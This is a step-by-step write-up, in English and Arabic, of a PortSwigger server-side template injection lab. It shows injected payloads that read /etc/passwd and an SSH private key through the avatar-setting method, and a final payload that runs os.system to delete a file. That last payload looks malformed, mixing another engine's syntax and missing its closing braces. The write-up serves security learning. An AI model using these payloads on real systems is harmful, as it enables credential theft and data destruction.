## Welcome, my friend. Today we will start the [7. SSTI lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit) in ```portswigger```
### Let's play this lab:

#### First, we navigate inside the browser
![image](https://github.com/user-attachments/assets/23b683a9-0ffc-4aca-ae8d-4083c64db2f2)

### اول خطوة هي اننا نتصفح الموقع ونرى ما هو مريب علشان نستغلها في اختراق ذلك التحدي. ,ومعانا حساب لنسجل عليه ```wiener:peter```:
****
### نلاحظ وجود ```Preferred name``` بالاسفل هو ده لغز التحدي.,وكمان هنلاحظ  ```Avatar``` لرفع ملفات سنحاول نرفع ملفات شيل :



![image](https://github.com/user-attachments/assets/3b42f8b4-46bf-45af-8b46-a08b5ea8e8cb)
### الرسالة بتوضح ممنوع نرفع ملفات من نوع php وايضا وضحت لينا الpath اللي بيستقبلها النظام لملفاتنا. 
```
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/shell.php', 'application/x-p...')
```


### لم نحصل على تنفيذ تلك الاكواد وهنا نتاكد ان الثغرة مش داخل الكومنت ولكن تذكر الجزء في اول الشرح قلتلك ده اللغز هنا بالظبط ```Preferred name``` هنبدأ نفتح burp ونعترض الطلب:
```
blog-post-author-display=user.setAvatar('/etc/passwd','image/jpg')
```

![image](https://github.com/user-attachments/assets/a00538dc-8b3f-4729-bbe2-08d13ec0ff43)




### وبعدها نروح نكتشف الكومنتات :
![image](https://github.com/user-attachments/assets/8c53044b-b4e0-450a-b660-8cb3546c1969)



## وهنا اكتشفنا انه تم تنفيذ العملية وعرفنا هنحقن الاكواد فين تعالى نحقن الكود التالي:

```
blog-post-author-display=user.setAvatar('/.ssh/id_rsa','image/jpg')
```
![image](https://github.com/user-attachments/assets/ec56bcff-ddd7-4068-9d83-97ef8347f8ef)

### بعدها نشيك على الكومنتات:

![image](https://github.com/user-attachments/assets/d2b78c03-cb13-46c9-950c-38ae2c2b7c90)

### جميل ظهر الفايل المراد حذفه هنستخدم الكود التالي:
```
{% import os %}{{os.system('rm /home/carlos/morale.txt')
```

![image](https://github.com/user-attachments/assets/2d4dfa5e-3323-4795-9ca9-755474545fa6)

### بعدها نشيك على الكومنتات:

![image](https://github.com/user-attachments/assets/09e3a3db-93db-43d2-94f7-ce1c0e3212ac)

## وهنا تم حل اللاب يا صديقي ;)





-----------------

Well, We Congratulations, the lab has been solved successfully.




<p align="center">
<img src="https://github.com/user-attachments/assets/853f5e50-d1fd-4465-9c5a-a3f27700e936" >
</p>
